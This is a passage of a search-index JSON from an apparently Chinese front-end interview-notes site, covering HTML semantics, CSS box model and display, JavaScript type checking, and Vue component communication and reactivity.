如何理解HTML语义化\",\"slug\":\"_1-如何理解html语义化\",\"contents\":[\"语义化是指根据内容的结构化（内容语义化），选择合适的标签（代码语义化）。通俗来讲就是用正确的标签做正确的事情\",\"语义化的优点如下：\",\"用户：提高体验，比如：title，alt用于解释名词和图片信息\",\"非技术人员：能看懂代码，很好的呈现内容结构、代码结构\",\"技术人员：便于团队开发与维护，语义化更具有可读性\",\"搜索引擎：利于SEO。语义化能和搜索引擎建立更好的联系，优化搜索。还支持读屏软件，根据文章可以自动生成目录，有利于无障碍\",\"常见的语义化标签：\",\"<header></header> 头部\",\"<nav></nav> 导航栏\",\"<section></section> 区块（有语义化的div）\",\"<main></main> 主要区域\",\"<article></article> 主要内容\",\"<aside></aside> 侧边栏\",\"<footer></footer> 底部\"]},{\"header\":\"2. WEB标准与W3C标准\",\"slug\":\"_2-web标准与w3c标准\",\"contents\":[\"WEB标准是指由万维网联盟（World Wide Web Consortium，简称W3C）制定的一系列技术规范和指南，旨在确保网页在不同的浏览器和设备上具有一致的表现和行为\",\"W3C标准是由W3C组织制定和推广的一系列技术标准，旨在推动网络技术的发展和互操作性\",\"具体来说，WEB标准和W3C标准强调以下几个方面：\",\"标签闭合：HTML标签必须按照规定的格式正确闭合，以确保页面结构的准确性和一致性\",\"标签小写：HTML标签和属性应该使用小写字母，以避免浏览器解析错误\",\"不乱嵌套：HTML标签应该按照正确的嵌套规则进行使用，不应该出现乱七八糟的嵌套结构，以确保页面结构的清晰和可维护性\",\"使用外链CSS和JS：将CSS样式和JavaScript代码尽可能地放在外部文件中，并通过链接的方式引入，以实现结构、行为和表现的分离，提高代码的可重用性和可维护性\"]},{\"header\":\"3. src和href的区别\",\"slug\":\"_3-src和href的区别\",\"contents\":[\"src 用于替换当前元素，href 用于在当前文档和引用资源之间确立联系\"]},{\"header\":\"1. src\",\"slug\":\"_1-src\",\"contents\":[\"src指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内\",\"src用于img、input、style、script、iframe\",\"<script src =”js.js”></script> \"]},{\"header\":\"2. href\",\"slug\":\"_2-href\",\"contents\":[\"href 是 Hypertext Reference 的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接\",\"href用于link、a标签\",\"<link href=”common.css” rel=”stylesheet”/> \"]},{\"header\":\"4. DOCTYPE的作用\",\"slug\":\"_4-doctype的作用\",\"contents\":[\"DOCTYPE即Document Type（文档类型声明）的作用是告知浏览器的解析器使用哪种HTML或XHTML规范来解析文档\",\"DOCTYPE需要放置在HTML文件的<html>标签之前\",\"当前主流：\",\"<!DOCTYPE html> <html> ... </html> \",\"早期：\",\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD HTML 4.01//EN\\\" \\\"http://www.w3.org/TR/html4/strict.dtd\\\"> <html> ... </html> \"]},{\"header\":\"5. script标签中defer和async\",\"slug\":\"_5-script标签中defer和async\",\"contents\":[\"defer 和 async 的使用, 可以用于提升网页性能\",\"script 标签存在两个属性，defer 和 async，因此 script 标签 的使用分为三种情况：\",\"<script src=\\\"example.js\\\"></script>\",\"没有 defer 或 async 属性，浏览器会立即加载并执行相应的脚本\",\"不等待后续加载的文档元素，读到就开始加载和执行，此举会阻塞后续文档的加载\",\"<script async src=\\\"example.js\\\"></script>\",\"有了 async 属性，表示后续文档的加载和渲染与 js 脚本的加载和执行是并行进行的，即异步执行\",\"<script defer src=\\\"example.js\\\"></script>\",\"有了 defer 属性，加载后续文档的过程和 js 脚本的加载是并行进行的(异步)，此时的 js 脚本仅加载不执行, js 脚本的执行需要等到文档所有元素解析完成之后，DOMContentLoaded 事件触发执行之前\",\"面试笔记-HTML01.png\",\"图例：绿线：HTML 的解析时间\",\"蓝线：JS 脚本的加载时间\",\"红色：JS 脚本的执行时间\",\"区别：\",\"defer 和 async 在网络加载过程是一致的，都是异步执行的；(放在页面顶部, 也不会阻塞页面的加载, 与页面加载同时进行)\",\"两者的区别, 脚本加载完成之后, async 是立刻执行, defer 会等一等 (等前面的 defer 脚本执行, 等 dom 的加载)\"]},{\"header\":\"6. meta标签的常用用法\",\"slug\":\"_6-meta标签的常用用法\",\"contents\":[\"<meta>标签的具体功能一般由name/http-equiv和content两部分属性来定义\",\"如果设置 name 属性，则它描述的是网页文档的信息（例如：作者、日期和时间、网页描述、 关键词）\",\"如果设置 http-equiv 属性，则它描述的相当于是 HTTP 响应头信息（例如：网页内容信息, 网页缓存等）\",\"常用的meta标签：\",\"charset，用来描述HTML文档的编码类型：\",\"<meta charset=\\\"UTF-8\\\" > \",\"keywords，页面关键词：\",\"<meta name=\\\"keywords\\\" content=\\\"关键词\\\" /> \",\"description，页面描述：\",\"<meta name=\\\"description\\\" content=\\\"页面描述内容\\\" /> \",\"refresh，页面重定向和刷新：\",\"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=\\\" /> \",\"viewport，适配移动端，可以控制视口的大小和比例：\",\"<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1, maximum-scale=1\\\"> \",\"其中，content 参数有以下几种：\",\"width：宽度(数值/device-width)\",\"height：高度(数值/device-height)\",\"initial-scale：初始缩放比例\",\"maximum-scale：最大缩放比例\",\"minimum-scale：最小缩放比例\",\"user-scalable：是否允许用户缩放(yes/no）\",\"搜索引擎索引方式：\",\"<meta name=\\\"robots\\\" content=\\\"index,follow\\\" /> \",\"其中，content 参数有以下几种：\",\"all：文件将被检索，且页面上的链接可以被查询\",\"none：文件将不被检索，且页面上的链接不可以被查询\",\"index：文件将被检索\",\"follow：页面上的链接可以被查询\",\"noindex：文件将不被检索\",\"nofollow：页面上的链接不可以被查询\"]},{\"header\":\"7. HTML5更新内容\",\"slug\":\"_7-html5更新内容\",\"contents\":[\"新增语义化标签：nav、header、footer、aside、section、article\",\"只有一种DOCTYPE文件类型声明（<!DOCTYPE html>）\",\"新增音视频标签：audio、video\",\"本地存储：localStorage、sessionStorage\",\"Canvas绘图、Geolocation地理定位、WebSocket即时通信、拖拽API\",\"input支持新的类型值：date、email、url等\",\"history API：go、forward、back、pushstate\",\"移除了：\",\"纯表现的元素：basefont，big，center，font, s，strike，tt，u\",\"对可用性产生负面影响的元素：frame，frameset，noframes\"]}]},\"/front-end/Interview-notes/02-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-CSS.html\":{\"title\":\"CSS\",\"contents\":[{\"header\":\"1. 盒模型\",\"slug\":\"_1-盒模型\",\"contents\":[\"浏览器的渲染引擎在对网页文档进行布局时，会按照 “CSS 基础盒模型” （CSS Basic Box Model）标准，将文档中的所有元素都表示为一个个矩形的盒子，再用 CSS 去决定这些盒子的大小尺寸、显示位置、以及其他属性（如颜色、背景、边框等）\",\"CSS3中的盒模型有以下两种：标准盒子模型、IE盒子模型\",\"盒模型都是由四个部分组成的，分别是margin（外边距）、border（边框）、padding（内边距）和content（内容）\",\"标准盒模型和IE盒模型的区别在于设置width和height时，所对应的范围不同：\",\"标准盒模型的width和height属性的范围只包含了content\",\"IE盒模型的width和height属性的范围包含了border、padding和content\",\"在 CSS3 中，我们可以通过设置 box-sizing 的值来决定具体使用何种盒模型：\",\"content-box 标准盒模型（默认值）\",\"border-box 怪异盒模型（IE盒模型）\"]},{\"header\":\"2. CSS选择器及其优先级\",\"slug\":\"_2-css选择器及其优先级\",\"contents\":[\"详见：CSS选择器\"]},{\"header\":\"3. CSS样式引入方式\",\"slug\":\"_3-css样式引入方式\",\"contents\":[\"详见：CSS样式引入方式\"]},{\"header\":\"4. CSS中可继承与不可继承属性有哪些\",\"slug\":\"_4-css中可继承与不可继承属性有哪些\",\"contents\":[]},{\"header\":\"1. 可继承属性\",\"slug\":\"_1-可继承属性\",\"contents\":[\"字体系列属性 \",\"font-family：字体系列\",\"font-weight：字体的粗细\",\"font-size：字体的大小\",\"font-style：字体的风格\",\"文本系列属性 \",\"text-indent：文本缩进\",\"text-align：文本水平对齐\",\"line-height：行高\",\"word-spacing：单词之间的间距\",\"letter-spacing：中文或者字母之间的间距\",\"text-transform：控制文本大小写（即uppercase、lowercase、capitalize）\",\"color：文本颜色\",\"元素可见性 \",\"visibility：控制元素显示隐藏\",\"列表布局属性 \",\"list-style：列表风格，包括list-style-type、list-style-image等\",\"光标属性 \",\"cursor：光标显示为何种形态\"]},{\"header\":\"2. 不可继承属性\",\"slug\":\"_2-不可继承属性\",\"contents\":[\"display\",\"文本属性 \",\"vertical-align：垂直文本对齐\",\"text-decoration：规定添加到文本的装饰\",\"text-shadow：文本阴影效果\",\"white-space：空白符的处理\",\"unicode-bidi：设置文本的方向\",\"盒子模型的属性\",\"背景属性\",\"定位属性\",\"生成内容属性\",\"轮廓样式属性\",\"页面样式属性\",\"声音样式属性\"]},{\"header\":\"5. display的属性值及其作用\",\"slug\":\"_5-display的属性值及其作用\",\"contents\":[\"属性值\",\"作用\",\"none\",\"元素不显示，并且会从文档流中移除\",\"block\",\"块类型。默认宽度为父元素宽度，可设置宽高，换行显示\",\"inline\",\"行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示\",\"inline-block\",\"默认宽度为内容宽度，可以设置宽高，同行显示\",\"list-item\",\"像块类型元素一样显示，并添加样式列表标记\",\"table\",\"此元素会作为块级表格来显示\",\"inherit\",\"规定应该从父元素继承display属性的值\"]},{\"header\":\"6. display的block、inline和inline-block的区别\",\"slug\":\"_6-display的block、inline和inline-block的区别\",\"contents\":[\"block：会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性\",\"inline：元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin\",\"inline-block：将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内\"]},{\"header\":\"7. 隐藏元素的方法\",\"slug\":\"_7-隐藏元素的方法\",\"contents\":[\"display: none：渲染树不会包含该渲染对象，因此该元素不会在页面中占据位置，也不会响应绑定的监听事件\",\"visibility: hidden：元素在页面中仍占据空间，但是不会响应绑定的监听事件\",\"opacity: 0：将元素的透明度设置为 0，以此来实现元素的隐藏。元素在页面中仍然占据空间，并且能够响应元素绑定的监听事件\",\"position: absolute：通过使用绝对定位将元素移除可视区域内，以此来实现元素的隐藏\",\"z-index: 负值：来使其他元素遮盖住该元素，以此来实现隐藏\",\"clip/clip-path ：使用元素裁剪的方法来实现元素的隐藏，这种方法下，元素仍在页面中占据位置，但是不会响应绑定的监听事件\",\"transform: scale(0,0)：将元素缩放为 0，来实现元素的隐藏。这种方法下，元素仍在页面中占据位置，但是不会响应绑定的监听事件\"]},{\"header\":\"8. link与@import的区别\",\"slug\":\"_8-link与-import的区别\",\"contents\":[\"两者都是外部引用CSS的方式，区别如下：\",\"link功能较多，可以定义RSS，而@import只能用于加载CSS\",\"当解析到link时，页面会同步加载所引用的 css，而@import所引用的 css 会等到页面加载完才被加载\",\"@import兼容性差\",\"link可以使用 js 动态引入，@import不行\"]},{\"header\":\"9. display:none与visibility:hidden的区别\",\"slug\":\"_9-display-none与visibility-hidden的区别\",\"contents\":[\"display:none与visibility:hidden都可以使元素不可见，区别如下：\",\"渲染树中 \",\"display: none;会使元素完全从渲染树中消失，不占据任何空间\",\"visibility: hidden;不会使元素从渲染树中消失，仍然占据空间，只是内容不可见\",\"继承性 \",\"display: none;是非继承属性，子孙节点消失是因为元素本身从渲染树中消失，修改子孙节点的属性无法使其显示\",\"visibility: hidden;是继承属性，子孙节点消失是因为继承了hidden属性，通过设置visibility: visible;可以使子孙节点显示\",\"导致重排和重绘 \",\"修改具有常规流的元素的display属性通常会导致文档重排（重新计算元素的位置和大小）\",\"修改visibility属性只会导致本元素的重绘（重新绘制元素的可见部分）\",\"读屏器（屏幕阅读软件） \",\"不会读取display: none;元素的内容\",\"会读取visibility: hidden;元素的内容\"]}]},\"/front-end/Interview-notes/03-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-JavaScript.html\":{\"title\":\"JavaScript\",\"contents\":[{\"header\":\"1. 面向过程与面向对象\",\"slug\":\"_1-面向过程与面向对象\",\"contents\":[]},{\"header\":\"1. 面向过程\",\"slug\":\"_1-面向过程\",\"contents\":[\"通过函数一步一步实现这些步骤，接着依次调用即可\",\"优点：性能上它是优于面向对象的，因为类在调用的时候需要实例化，开销过大\",\"缺点：不易维护、复用、扩展\",\"用途：单片机、嵌入式开发、Linux/Unix等对性能要求较高的地方\"]},{\"header\":\"2. 面向对象\",\"slug\":\"_2-面向对象\",\"contents\":[\"将数据与函数绑定到一起，进行封装减少了重复代码的重写过程\",\"优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统更加灵活、更加易于维护\",\"缺点：性能比面向过程低\"]},{\"header\":\"2. BOM和DOM\",\"slug\":\"_2-bom和dom\",\"contents\":[]},{\"header\":\"1. BOM（window）\",\"slug\":\"_1-bom-window\",\"contents\":[\"Browser Object Model（浏览器对象模型），是JavaScript的组成之一，它提供了独立于内容与浏览器窗口进行交互的对象，使用浏览器对象模型可以实现与HTML的交互\",\"window对象：alert() , prompt() , confirm() , setInterval() , clearInterval() , setTimeout() , clearTimeout()\",\"history对象：go()、back() , foward()\",\"location对象：href属性\"]},{\"header\":\"2. DOM（document）\",\"slug\":\"_2-dom-document\",\"contents\":[\"Document Object Model（文档对象模型）\",\"JavaScript中通过DOM来对HTML文档进行操作\",\"文档是整个的HTML网页文档\",\"将网页中的每一个部分都转换为了一个对象\",\"使用模型来表示对象之间的关系，方便获取对象\"]},{\"header\":\"3. 常用触发事件\",\"slug\":\"_3-常用触发事件\",\"contents\":[\"<input type=\\\"text\\\" onkeyup=\\\"myFunction()\\\"> \",\"document.addEventListener(event, function[, useCapture]) //不用 \\\"on\\\" 前缀。例如，使用 \\\"click\\\" 来取代 \\\"onclick\\\"。 //true - 事件在捕获阶段执行 //false- 默认。事件在冒泡阶段执行 \",\"鼠标事件：\",\"属性\",\"描述\",\"onclick\",\"当用户点击某个对象时调用的事件句柄。\",\"ondblclick\",\"当用户双击某个对象时调用的事件句柄。\",\"onmousedown\",\"鼠标按钮被按下。\",\"onmousemove\",\"鼠标被移动。\",\"onmouseover\",\"鼠标移到某元素之上。\",\"onmouseout\",\"鼠标从某元素移开。\",\"onmouseup\",\"鼠标按键被松开。\",\"键盘事件：\",\"属性\",\"描述\",\"onkeydown\",\"某个键盘按键被按下。\",\"onkeypress\",\"某个键盘按键被按下并松开。\",\"onkeyup\",\"某个键盘按键被松开。\",\"表单事件：\",\"属性\",\"描述\",\"onchange\",\"该事件在表单元素的内容改变时触发( <input>, <keygen>, <select>, 和 <textarea>)\",\"onfocus\",\"元素获取焦点时触发\",\"onfocusin\",\"元素即将获取焦点时触发\",\"onfocusout\",\"元素即将失去焦点时触发\",\"oninput\",\"元素获取用户输入时触发\",\"onreset\",\"表单重置时触发\",\"onsearch\",\"用户向搜索域输入文本时触发 ( <input=\\\"search\\\">)\",\"onselect\",\"用户选取文本时触发 ( <input> 和 <textarea>)\",\"onsubmit\",\"表单提交时触发\"]},{\"header\":\"4. ES6新增内容\",\"slug\":\"_4-es6新增内容\",\"contents\":[\"数据类型：基本数据类型：Symbol，引用数据类型：Set、Map\",\"运算符：变量的解构赋值、对象和数组新增了扩展运算符\",\"字符串方法：模版字符串\",\"块级作用域：let、const\",\"原生提供Proxy构造函数，用来生成Proxy实例\",\"定义类的语法糖：class\",\"模块化：import、export\",\"生成器（Generator）和迭代器（Iterator）\",\"详见：ES6\"]},{\"header\":\"5. JavaScript有哪些数据类型，区别是什么\",\"slug\":\"_5-javascript有哪些数据类型-区别是什么\",\"contents\":[\"JavaScript共有八种数据类型，分别是 Undefined、Null、Boolean、Number、String、Object、Symbol、BigInt\",\"可以分为两种：基本数据类型和引用数据类型\"]},{\"header\":\"1. 基本数据类型\",\"slug\":\"_1-基本数据类型\",\"contents\":[\"基本类型主要为以下6种：\",\"Number\",\"String\",\"Boolean\",\"Undefined\",\"Null\",\"Symbol\",\"基本数据类型存储在栈中\"]},{\"header\":\"2. 引用数据类型\",\"slug\":\"_2-引用数据类型\",\"contents\":[\"主要有：\",\"Object\",\"Array\",\"Function\",\"引用数据类型的对象存储于堆中\"]},{\"header\":\"6. 数据类型检测的方式\",\"slug\":\"_6-数据类型检测的方式\",\"contents\":[]},{\"header\":\"1. typeof\",\"slug\":\"_1-typeof\",\"contents\":[\"typeof是通过变量存储的机器码的低位1-3位存储类型信息来判断的\",\"console.log(typeof 2); // number console.log(typeof true); // boolean console.log(typeof 'str'); // string console.log(typeof []); // object console.log(typeof function(){}); // function console.log(typeof {}); // object console.log(typeof undefined); // undefined console.log(typeof null); // object \",\"其中数组、对象、null都会被判断为Object，其他判断都正确\"]},{\"header\":\"2. instanceof\",\"slug\":\"_2-instanceof\",\"contents\":[\"instanceof可以正确判断对象的类型，其内部运行机制是判断其原型链中能否找到该类型的原型\",\"console.log(2 instanceof Number); // false console.log(true instanceof Boolean); // false console.log('str' instanceof String); // false console.log([] instanceof Array); // true console.log(function(){} instanceof Function); // true console.log({} instanceof Object); // true \",\"instanceof只能正确判断引用数据类型，而不能判断基本数据类型\",\"instanceof可以用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性\"]},{\"header\":\"3. constructor\",\"slug\":\"_3-constructor\",\"contents\":[\"console.log((2).constructor === Number); // true console.log((true).constructor === Boolean); // true console.log(('str').constructor === String); // true console.log(([]).constructor === Array); // true console.log((function() {}).constructor === Function); // true console.log(({}).constructor === Object); // true \",\"constructor有两个作用，一是判断数据的类型，二是对象实例通过 constrcutor 对象访问它的构造函数\",\"注意：如果创建一个对象来改变它的原型，constructor就不能用来判断数据类型了\",\"function Fn(){}; Fn.prototype = new Array(); var f = new Fn(); console.log(f.constructor===Fn); // false console.log(f.constructor===Array); // true \"]},{\"header\":\"4. Object.prototype.toString.call()\",\"slug\":\"_4-object-prototype-tostring-call\",\"contents\":[\"使用 Object 对象的原型方法 toString 来判断数据类型：\",\"var a = Object.prototype.toString; console.log(a.call(2)); console.log(a.call(true)); console.log(a.call('str')); console.log(a.call([])); console.log(a.call(function(){})); console.log(a.call({})); console.log(a.call(undefined)); console.log(a.call(null)); \"]},{\"header\":\"7. 判断数组的方式有哪些\",\"slug\":\"_7-判断数组的方式有哪些\",\"contents\":[\"通过Object.prototype.toString.call()\",\"let res = Object.prototype.toString.call(obj) === '[object Array]'; \",\"通过原型链\",\"let res = obj.__proto__ === Array.prototype; \",\"通过Array.isArray()\",\"let res = Array.isArray(obj); \",\"通过instanceof\",\"let res = obj instanceof Array; \",\"通过Array.prototype.isPrototypeOf()\",\"let res = Array.prototype.isPrototypeOf(obj); \"]},{\"header\":\"8. null和undefined的区别\",\"slug\":\"_8-null和undefined的区别\",\"contents\":[\"首先Undefined和Null都是基本数据类型，这两个基本数据类型分别都只有一个值，就是 undefined 和 null\",\"undefined 代表的含义是未定义，null 代表的含义是空对象。一般变量声明了但还没有定义的时候会返回 undefined，null主要用于赋值给一些可能会返回对象的变量，作为初始化\",\"undefined 在 JavaScript 中不是一个保留字，这意味着可以使用 undefined 来作为一个变量名，但是这样的做法是非常危险的，它会影响对 undefined 值的判断。我们可以通过一些方法获得安全的 undefined 值，比如说 void 0\",\"var x = void 0; console.log(x); // undefined \",\"当对这两种类型使用 typeof 进行判断时，Null 类型化会返回 object，这是一个历史遗留的问题。当使用双等号对两种类型的值进行比较时会返回 true，使用三个等号时会返回 false\"]},{\"header\":\"9. typeof null 的结果是什么，为什么？\",\"slug\":\"_9-typeof-null-的结果是什么-为什么\",\"contents\":[\"JS 存在的一个悠久 Bug。在 JS 的最初版本中使用的是 32 位系统，为了性能考虑使用低位存储变量的类型信息，000 开头代表是对象然而 null 表示为全零，所以将它错误的判断为 object\"]},{\"header\":\"10. intanceof 操作符的实现原理及实现\",\"slug\":\"_10-intanceof-操作符的实现原理及实现\",\"contents\":[\"详见：手写instanceof方法\"]}]},\"/front-end/Interview-notes/04-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-Vue.html\":{\"title\":\"Vue\",\"contents\":[{\"header\":\"1. Vue3和Vue2的区别\",\"slug\":\"_1-vue3和vue2的区别\",\"contents\":[]},{\"header\":\"1. 双向数据绑定原理发生了改变\",\"slug\":\"_1-双向数据绑定原理发生了改变\",\"contents\":[\"Vue2是由数据劫持结合发布-订阅的模式实现的，通过object.defineProperty()来劫持对象属性的getter和setter操作，在数据变动时发布消息给订阅者，触发响应的监听回调\",\"Vue3中使用了ES6的Proxy对数据代理\"]},{\"header\":\"2. 定义数据变量和方法的改变\",\"slug\":\"_2-定义数据变量和方法的改变\",\"contents\":[\"Vue2定义数据变量是data(){}，创建的方法要在methods:{}中\",\"Vue3直接在setup(){}中，在这里面定义的变量和方法因为最终要在模板中使用，所以最后都得 return\"]},{\"header\":\"3. 生命周期函数不同\",\"slug\":\"_3-生命周期函数不同\",\"contents\":[\"Vue2中的生命周期：\",\"beforeCreate 组件创建之前\",\"created 组件创建之后\",\"beforeMount 组件挂载到页面之前执行\",\"mounted 组件挂载到页面之后执行\",\"beforeUpdate 组件更新之前\",\"updated 组件更新之后\",\"Vue3中的生命周期：\",\"setup 开始创建组件\",\"onBeforeMount 组件挂载到页面之前执行\",\"onMounted 组件挂载到页面之后执行\",\"onBeforeUpdate 组件更新之前\",\"onUpdated 组件更新之后\",\"而且Vue3.x 生命周期在调用前需要先进行引入\"]},{\"header\":\"4. 性能更好\",\"slug\":\"_4-性能更好\",\"contents\":[\"速度更快\",\"体积减少\",\"更易维护\",\"更接近原生\",\"更易使用\",\"更好的TS支持\"]},{\"header\":\"2. Vue组件间通信\",\"slug\":\"_2-vue组件间通信\",\"contents\":[]},{\"header\":\"1. props\",\"slug\":\"_1-props\",\"contents\":[\"适用场景：父组件传递数据给子组件\",\"使用：\",\"子组件设置props属性，定义接收父组件传递过来的参数\",\"父组件在使用子组件标签中通过字面量来传递值\",\"Children.vue\",\"<template> <div id=\\\"children\\\"> <p>{{msg}}</p> <button @click=\\\"fn\\\">按钮</button> </div> </template> <script> export default { name: \\\"Children\\\", props: [\\\"msg\\\", \\\"fn\\\"] }; </script> \",\"Father.vue\",\"<template> <div id=\\\"father\\\"> <Children :msg=\\\"msgData\\\" :fn=\\\"myFunction\\\"></Children> </div> </template> <script> import Children from \\\"./Children.vue\\\"; export default { name: \\\"Father\\\", data() { msgData: \\\"父组件数据\\\"; }, methods: { myFunction() { console.log(\\\"vue\\\"); } }, components: { Children } }; </script> \"]},{\"header\":\"2. $emit触发自定义事件\",\"slug\":\"_2-emit触发自定义事件\",\"contents\":[\"适用场景：子组件传递数据给父组件\",\"使用：\",\"子组件通过$emit触发自定义事件，$emit第二个参数为传递的数值\",\"父组件绑定监听器获取到子组件传递过来的参数\",\"Children.vue\",\"this.$emit('add', good) \",\"Father.vue\",\"<Children @add=\\\"cartAdd($event)\\\" /> \"]},{\"header\":\"3. ref\",\"slug\":\"_3-ref\",\"contents\":[\"使用：\",\"父组件在使用子组件的时候设置ref\",\"父组件通过设置子组件ref来获取数据\",\"Father.vue\",\"<Children ref=\\\"foo\\\" /> this.$refs.foo // 获取子组件实例，通过子组件实例我们就能拿到对应的数据 \"]},{\"header\":\"4. 事件总线（EventBus）\",\"slug\":\"_4-事件总线-eventbus\",\"contents\":[\"适用场景：兄弟组件传值\",\"使用：\",\"创建一个中央事件总线EventBus\",\"兄弟组件通过$emit触发自定义事件，$emit第二个参数为传递的数值\",\"另一个兄弟组件通过$on监听自定义事件\",\"安装全局事件总线：\",\"new Vue({ ... beforeCreate() { Vue.prototype.$bus = this // 安装全局事件总线，$bus 就是当前应用的 vm }, ... }) \",\"发送事件：\",\"<template> <div> <button @click=\\\"add\\\">加法</button> </div> </template> <script> export default { data(){ return{ num:0 } }, methods:{ add(){ this.$bus.$emit('addition', { num:this.num++ }) } } } </script> \",\"接收事件：\",\"<template> <div>求和: {{count}}</div> </template> <script> export default { data() { return { count: 0 } }, mounted() { this.$bus.$on('addition', param => { this.count = this.count + param.num; }) } } </script> \"]},{\"header\":\"5. provide与inject\",\"slug\":\"_5-provide与inject\",\"contents\":[\"使用：\",\"在祖先组件定义provide属性，返回传递的值\",\"在后代组件通过inject接收组件传递过来的值\",\"祖先组件：\",\"provide(){ return { foo:'foo' } } \",\"后代组件\",\"inject:['foo'] // 获取到祖先组件传递过来的值 \"]},{\"header\":\"6. $parent/$children\",\"slug\":\"_6-parent-children\",\"contents\":[\"使用$parent可以让组件访问父组件的实例（访问的是上一级父组件的属性和方法）\",\"使用$children可以让组件访问子组件的实例，但是，$children并不能保证顺序，并且访问的数据也不是响应式的\"]},{\"header\":\"7. $attrs/$listeners\",\"slug\":\"_7-attrs-listeners\",\"contents\":[\"适用场景：祖先传递数据给子孙\"]},{\"header\":\"8. 总结\",\"slug\":\"_8-总结\",\"contents\":[\"父子关系的组件数据传递选择 props 与 $emit进行传递，也可选择ref\",\"兄弟关系的组件数据传递可选择$bus，其次可以选择$parent进行传递\",\"祖先与后代组件数据传递可选择attrs与listeners或者 Provide与 Inject\",\"复杂关系的组件数据传递可以通过vuex存放共享的变量\"]},{\"header\":\"3. Vue的基本原理\",\"slug\":\"_3-vue的基本原理\",\"contents\":[\"当一个Vue实例创建时，Vue会遍历data中的属性，用 Object.defineProperty（Vue3.0使用proxy ）将它们转为 getter/setter，并且在内部追踪相关依赖，在属性被访问和修改时通知变化。 每个组件实例都有相应的 watcher 程序实例，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的setter被调用时，会通知watcher重新计算，从而致使它关联的组件得以更新\"]},{\"header\":\"4. Vue双向数据绑定的原理\",\"slug\":\"_4-vue双向数据绑定的原理\",\"contents\":[\"Vue.js 是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。主要分为以下几个步骤：\",\"需要observer对数据对象进行递归遍历，包括子属性对象的属性，都加上setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化\",\"compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图\",\"Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是: ①在自身实例化时往属性订阅器(dep)里面添加自己 ②自身必须有一个update()方法 ③待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退\",\"MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -> 视图更新；视图交互变化(input) -> 数据model变更的双向绑定效果\"]},{\"header\":\"5. 使用 Object.defineProperty() 来进行数据劫持有什么缺点？\",\"slug\":\"_5-使用-object-defineproperty-来进行数据劫持有什么缺点\",\"contents\":[\"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为Object.defineProperty()不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题\"]},{\"header\":\"6. MVVM、MVC、MVP的区别\",\"slug\":\"_6-mvvm、mvc、mvp的区别\",\"contents\":[\"MVVM、MVC、MVP中的M指model层，V指view层：\",\"Model 层很好理解，就是存储数据\",\"View 层则是展示数据\"]},{\"header\":\"1. MVC\",\"slug\":\"_1-mvc\",\"contents\":[\"Controller 控制器层 ： 负责连接 Model 层和 View 层，接受并处理 View 层触发的事件，并在 Model 层的数据状态变动时更新 View层\",\"典型思路是 View 层通过事件通知到 Controller 层，Controller 层经过对事件的处理完成相关业务逻辑，要求 Model 层改变数据状态，Model 层再将新数据更新到 View层\",\"在实际操作时，用户可以直接对 View 层的 UI 进行操作，以通过事件通知 Controller 层，经过处理后修改 Model 层的数据，Model 层使用最新数据更新 View\"]},{\"header\":\"2. MVP\",\"slug\":\"_2-mvp\",\"contents\":[\"Presenter 管理层 ： 负责连接 Model 层和 View 层，处理 View 层的事件，负责获取数据并将获取的数据经过处理后更新 View\",\"典型流程是 View 层触发的事件传递到 Presenter 层中处理，Presenter 层去操作 Model 层，并且将数据返回给 View层，这个过程中，View 层和 Model 层没有直接联系。而 View 层不部署业务逻辑，除了展示数据和触发事件之外，其它时间都在等着 Presenter 层来更新自己，被称为「被动视图」\",\"在实际操作时，用户可以直接对 View 层的 UI 进行操作，View 层通知 Presenter 层，Presenter 层操作 Model 层的数据，Presenter 层获取到数据之后更新 View\"]},{\"header\":\"3. MVVM\",\"slug\":\"_3-mvvm\",\"contents\":[\"ViewModel 层相当于 Presenter 层，负责绑定 Model 层和 View 层，相比于 MVP 增加了双向绑定机制\",\"MVVM 模式的特征是 ViewModel 层和 View 层采用双向绑定的形式（Binding），双向数据绑定允许视图（View）和视图模型（ViewModel）之间的数据变化相互影响，View 层的变动，将自动反映在 ViewModel 层，反之亦然\"]},{\"header\":\"7. computed和watch的区别\",\"slug\":\"_7-computed和watch的区别\",\"contents\":[\"computed：\",\"它是计算属性。主要用于值的计算并一般会返回一个值。所以它更多用于计算值的场景\",\"它具有缓存性。当访问它来获取值时，它的 getter 函数所计算出来的值会进行缓存\",\"只有当它依赖的属性值发生了改变，那下⼀次再访问时才会重新调用 getter 函数来计算\",\"它适用于计算比较消耗性能的计算场景\",\"必须要有一个返回值\",\"不支持异步\",\"watch：\",\"它更多的是起到 “观察” 的作用，类似于对数据进行变化的监听并执行回调。主要用于观察 props 或本组件 data 